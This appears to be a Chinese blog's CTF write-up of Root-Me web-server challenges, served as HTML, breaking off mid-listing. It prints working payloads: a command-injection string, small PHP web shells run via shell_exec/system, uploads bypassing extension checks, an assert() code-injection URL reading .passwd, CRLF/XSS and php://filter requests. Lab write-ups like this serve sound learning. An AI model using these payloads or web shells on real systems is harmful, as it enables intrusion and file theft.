@@ -1,0 +1,1557 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rootme.webserver1">
+<meta property="og:url" content="http://chaosec.top/2018/07/31/rootme/index.html">
+<meta property="og:site_name" content="Charles&#39; Blog">
+<meta property="og:description" content="前言最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/1.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/2.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/3.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/4.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/5.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/6.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/7.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/8.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/11.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/9.png">
+<meta property="og:image" content="http://chaosec.top/2018/07/31/rootme/10.png">
+<meta property="og:updated_time" content="2019-01-30T11:50:04.808Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="rootme.webserver1">
+<meta name="twitter:description" content="前言最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。">
+<meta name="twitter:image" content="http://chaosec.top/2018/07/31/rootme/1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Charles' Blog" type="application/atom+xml"/>
+
+
+
+
+  <link rel="canonical" href="http://chaosec.top/2018/07/31/rootme/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>rootme.webserver1 | Charles' Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Charles' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">前方如聂鲁达的爱情诗一般美好</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://chaosec.top/2018/07/31/rootme/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="新城瑞雪"/>
+      <meta itemprop="description" content="相逢意气为君饮"/>
+      <meta itemprop="image" content="/images/avatar.gif"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Charles' Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">rootme.webserver1
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-07-31 17:45:39" itemprop="dateCreated datePublished" datetime="2018-07-31T17:45:39+08:00">2018-07-31</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-01-30 19:50:04" itemprop="dateModified" datetime="2019-01-30T19:50:04+08:00">2019-01-30</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+            <span id="/2018/07/31/rootme/" class="leancloud_visitors" data-flag-title="rootme.webserver1">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读次数：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。</p>
+<a id="more"></a>
+<h1 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web-Server"></a>Web-Server</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>签到题，查看元素即可。</p>
+<h2 id="HTTP-Open-redirect"><a href="#HTTP-Open-redirect" class="headerlink" title="HTTP-Open redirect"></a>HTTP-Open redirect</h2><p>查看提示可知，题目要求我们能够重定向网页到另一个网址，可以尝试抓包看一下，发现发起的请求如下</p>
+<blockquote>
+<p>GET /web-serveur/ch52/?url=<a href="https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134" target="_blank" rel="noopener">https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134</a> HTTP/1.1</p>
+</blockquote>
+<p>那么我们可以尝试修改url实现重定向，但是不对，猜测h字段应该也要相应变化，感觉这个h字段像是一段hash值，测试了一下发现前面url的值的MD5<br>的值正好是后面h字段的值，于是此题就解出来了，payload如下(用bp发送比较好)</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//qq.com&amp;h=fb992d62fc0302ccc9da03fe80fb1d42</span></span><br></pre></td></tr></table></figure>
+<h2 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h2><p>题目其实不难，我想复杂了，想着要反弹shell，结果没成功，还是我对命令注入理解太少了，没什么很难的点，直接上payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;more index.php</span><br></pre></td></tr></table></figure>
+<p>也可以用cat命令，然后查看元素即可</p>
+<h2 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h2><p>弱口令，用户名和密码均为admin</p>
+<h2 id="User-agent"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</h2><p>看标题应该和user-agent字段有关，访问题目可得</p>
+<blockquote>
+<p>Wrong user-agent: you are not the “admin” browser!</p>
+</blockquote>
+<p>所以我们直接修改user-agent字段为admin然后即可hack</p>
+<h2 id="Backup-file"><a href="#Backup-file" class="headerlink" title="Backup file"></a>Backup file</h2><p>题目存在备份文件泄露漏洞，泄露的文件为 <code>index.php~</code> ，下载之后即可得flag</p>
+<h2 id="HTTP-POST"><a href="#HTTP-POST" class="headerlink" title="HTTP - POST"></a>HTTP - POST</h2><p>抓包绕过前端js，修改score值在发包即可</p>
+<h2 id="HTTP-directory-indexing"><a href="#HTTP-directory-indexing" class="headerlink" title="HTTP directory indexing"></a>HTTP directory indexing</h2><p>打开题目查看元素， <code>include(&quot;admin/pass.html&quot;)</code> ，打开题目之后却说这是逗我玩的，之后尝试访问admin，可以访问，接着依次访问 <code>backup/admin.txt</code> 即可得到flag</p>
+<h2 id="HTTP-Headers"><a href="#HTTP-Headers" class="headerlink" title="HTTP Headers"></a>HTTP Headers</h2><p>应该是修改请求头，抓包看一下发现有个字段 <code>Header-RootMe-Admin: none</code> ，尝试着把它的值改为true，再次发起请求即可得到flag</p>
+<h2 id="HTTP-verb-tampering"><a href="#HTTP-verb-tampering" class="headerlink" title="HTTP verb tampering"></a>HTTP verb tampering</h2><p>这个题没有理解题目的意思，标题的中文意思是 <strong>http动作篡改</strong> ，不知道这个题目要什么，查阅资料后才知道这个题目是要求我们改变我们发起请求的方法，猜测题目应该存在某种逻辑错误导致可以用过更换请求方式来实现绕过，本来可以用curl命令来发起请求，但是我试了没有成功，所以我写了个简单的代码实现它</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://challenge01.root-me.org/web-serveur/ch8/'</span></span><br><span class="line">content = requests.put(url).content</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
+<h2 id="Install-files"><a href="#Install-files" class="headerlink" title="Install files"></a>Install files</h2><p>我并没有理解这道题的意义在哪，题目提示 <code>you know phpbb</code> ，又提到install file，直接google一下 <code>phpbb install file</code> 即可得到phpbb系统的安装包位置，访问即可获得flag</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch6<span class="regexp">/phpbb/i</span>nstall<span class="regexp">/install.php</span></span><br></pre></td></tr></table></figure>
+<h2 id="Improper-redirect"><a href="#Improper-redirect" class="headerlink" title="Improper redirect"></a>Improper redirect</h2><p>直接抓包修改login.php为index.php即可</p>
+<p><img src="/2018/07/31/rootme/1.png" alt=""></p>
+<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><hr>
+<p>首先了解一波CRLF</p>
+<blockquote>
+<p>CRLF是“回车+换行”（\r\n）的简称，在HTTP协议中，，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。</p>
+</blockquote>
+<p>我的理解就是该种攻击方式能够在HTTP头部注入HTML代码，从而达到html代码注入的目的</p>
+<p><em>0X01</em></p>
+<p>对于HRS最简单的利用方式是注入两个\r\n，之后在写入XSS代码，来构造一个xss</p>
+<p>比如某个网站接受的参数为 <a href="http://test.sina.com.cn/?url=xxx" target="_blank" rel="noopener">http://test.sina.com.cn/?url=xxx</a> ，xxx放在Location后面作为一个跳转。如果我们输出的是</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>=%0d%0a%0d%0a&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(/xxx/)&gt;</span><br></pre></td></tr></table></figure>
+<p>那么返回的包就会是</p>
+<blockquote>
+<p>HTTP/1.1 302 Moved Temporarily<br>Date: Fri, 27 Jun 2014 17:52:17 GMT<br>Content-Type: text/html<br>Content-Length: 154<br>Connection: close<br>Location:<br>&lt;img src=1 onerror=alert(/xxx/)&gt;</p>
+</blockquote>
+<p>所以就实现了xxs的构造</p>
+<p>HRS输入是无视浏览器Filter的，浏览器Filter是一些浏览器应对XSS的保护策略，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter，所以我们可以考虑通过HRS将 <code>X-XSS-Protection:0</code> 注入到HTTP头部中，在利用两个CRLF注入xss代码从而可以实现xss漏洞</p>
+<p><a href="https://blog.csdn.net/think_ycx/article/details/50267801" target="_blank" rel="noopener">参考链接</a></p>
+<hr>
+<p>题目给出了提示</p>
+<blockquote>
+<p>Inject false data in the journalisation log.</p>
+</blockquote>
+<p>但是我并不知道究竟怎么样才算是一个false data，不知道这个题目用CRLF怎么来玩，看了别人的wp思路后，可以构造出payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /web-serveur/ch14/?<span class="attribute">username</span>=guest authenticated.%0d%0aguest&amp;<span class="attribute">password</span>=12456 HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>刚开始我不懂为什么这样做的原因，但是我看到提交一次请求，日志中更新了两条信息</p>
+<blockquote>
+<p>guest authenticated.<br>guest failed to authenticate.</p>
+</blockquote>
+<p>是不是因为一次更新了两条信息从而满足了false data的条件呢？我尝试了其他payload，例如</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /web-serveur/ch14/?<span class="attribute">username</span>=admin authenticated.%0d%0Aadmin&amp;<span class="attribute">password</span>=12456 HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>也是可以的，但是当第一条记录是失败记录时则无法得到flag。总之这题的原理还是不很清楚。</p>
+<h2 id="File-upload-double-extensions"><a href="#File-upload-double-extensions" class="headerlink" title="File upload - double extensions"></a>File upload - double extensions</h2><p>文件上传。题目要求读根目录下的.passwd文件，题目给出了提示 <code>double extensions（双后缀）</code> ，基本可以知道这个上传是双后缀名绕过，本地写一个PHP文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$content = shell_exec($_GET[<span class="string">'snow'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>保存，修改后缀名为 <code>.php.jpg</code> 然后上传即可获得文件路径，发起如下GET请求</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch20<span class="regexp">/galerie/u</span>pload<span class="regexp">/lngij69s7er2fa7oupcg6nold6/</span><span class="number">1</span>.php.jpg?snow=ls ..<span class="regexp">/../</span>..<span class="regexp">/ -a</span></span><br></pre></td></tr></table></figure>
+<p>依次向父目录跳转，直到看到.passwd文件，读文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch20<span class="regexp">/galerie/u</span>pload<span class="regexp">/lngij69s7er2fa7oupcg6nold6/</span><span class="number">1</span>.php.jpg?snow=cat ..<span class="regexp">/../</span>..<span class="regexp">/.passwd</span></span><br></pre></td></tr></table></figure>
+<h2 id="File-upload-MIME-type"><a href="#File-upload-MIME-type" class="headerlink" title="File upload - MIME type"></a>File upload - MIME type</h2><p>看题目提示直接修改文件类型即可，不需要更改后缀，创建一个PHP文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'snow'</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>提交，抓包修改一下</p>
+<p><img src="/2018/07/31/rootme/2.png" alt=""></p>
+<h2 id="HTTP-cookies"><a href="#HTTP-cookies" class="headerlink" title="HTTP cookies"></a>HTTP cookies</h2><p>考察修改cookie的基本知识，修改cookie值为admin即可</p>
+<h2 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h2><p>可以尝试随便点一下，看到URL变化了</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//challenge01.root-me<span class="meta">.org</span>/web-serveur/ch15/ch15.php?galerie=devices</span><br></pre></td></tr></table></figure>
+<p>猜测 <code>?galerie=devices</code> 中的devices应该是目录名，所以我们可以尝试一下 </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch15<span class="regexp">/ch15.php?galerie=./</span></span><br></pre></td></tr></table></figure>
+<p>看到确实多出来一个区块</p>
+<p><img src="/2018/07/31/rootme/3.png" alt=""></p>
+<p>无法直接点击，查看元素</p>
+<p><img src="/2018/07/31/rootme/4.png" alt=""></p>
+<p>按照路径访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch15<span class="regexp">/ch15.php?galerie=./</span><span class="regexp">/86hwnX2r</span></span><br></pre></td></tr></table></figure>
+<p>可以看到有password区块，查看元素可以看到路径</p>
+<p><img src="/2018/07/31/rootme/5.png" alt=""></p>
+<p>但是用get请求无法访问，要用路径名访问才可以，最终payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch15<span class="regexp">/galerie/</span><span class="regexp">/86hwnX2r/</span>password.txt</span><br></pre></td></tr></table></figure>
+<h2 id="File-upload-null-byte"><a href="#File-upload-null-byte" class="headerlink" title="File upload - null byte"></a>File upload - null byte</h2><p>考察%00截断，新建PHP文件，改后缀名为 <code>filename.php%00.jpg</code> 上传并访问即可获得flag</p>
+<h2 id="PHP-assert"><a href="#PHP-assert" class="headerlink" title="PHP assert()"></a>PHP assert()</h2><p>这题涨姿势了，应该考察的是函数闭合的问题，先尝试随便输入一下，没什么反应，尝试输入非法内容诱使报错</p>
+<p><img src="/2018/07/31/rootme/6.png" alt=""></p>
+<p>可以推测报错对应代码应该是 <code>assert(strpos(&#39;includes/home.php&#39;, &#39;..&#39;) === false);</code> ，那么我们是否可以尝试向SQL注入一样闭合括号呢？由报错信息可以看到我们可控的输入内容是 <code>home</code> 这个位置，那么我们尝试闭合一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">','</span>..<span class="string">') === false and strpos('</span>s</span><br></pre></td></tr></table></figure>
+<p>拼接到上述代码中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(strpos(<span class="string">'includes/a'</span>,<span class="string">'..'</span>) === <span class="keyword">false</span> <span class="keyword">and</span> strpos(<span class="string">'s.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<p>如此代码成功闭合，那么我们只需要构造代码读取 .passwd 文件的内容即可，最终payload</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch47/?page=home<span class="string">','</span>..') === <span class="literal">false</span> <span class="keyword">and</span> $flag=fopen('.passwd<span class="string">','</span>r') <span class="keyword">and</span> print(fread($flag,filesize('.passwd'))) <span class="keyword">and</span> strpos(<span class="symbol">'home</span></span><br></pre></td></tr></table></figure>
+<h2 id="PHP-filters"><a href="#PHP-filters" class="headerlink" title="PHP filters"></a>PHP filters</h2><p>考察PHP://filter的应用</p>
+<p>尝试读取文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch12<span class="regexp">/?inc=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode<span class="regexp">/resource=login.php</span></span><br></pre></td></tr></table></figure>
+<p>base64解码得到源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">"username"</span>]==$username &amp;&amp; $_POST[<span class="string">"password"</span>]==$password)&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;h2&gt;Welcome back !&lt;/h2&gt;"</span>);</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"To validate the challenge use this password&lt;br/&gt;&lt;br/&gt;"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;h3&gt;Error : no such user/password&lt;/h2&gt;&lt;br /&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">  Login&amp;nbsp;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  Password&amp;nbsp;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"submit"</span> value=<span class="string">"connect"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再访问config.php</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch12<span class="regexp">/?inc=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode<span class="regexp">/resource=config.php</span></span><br></pre></td></tr></table></figure>
+<p>解码即可得到flag</p>
+<h2 id="PHP-register-globals"><a href="#PHP-register-globals" class="headerlink" title="PHP register globals"></a>PHP register globals</h2><p>查看提示</p>
+<blockquote>
+<p>It seems that the developper often leaves backup files around…</p>
+</blockquote>
+<p>可能存在备份文件泄露，尝试发现存在 <code>index.php.bak</code> ，访问之后下载文件，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($password, $hidden_password)</span></span>&#123;</span><br><span class="line">    $res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($password) &amp;&amp; $password!=<span class="string">""</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( $password == $hidden_password )&#123;</span><br><span class="line">            $res=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 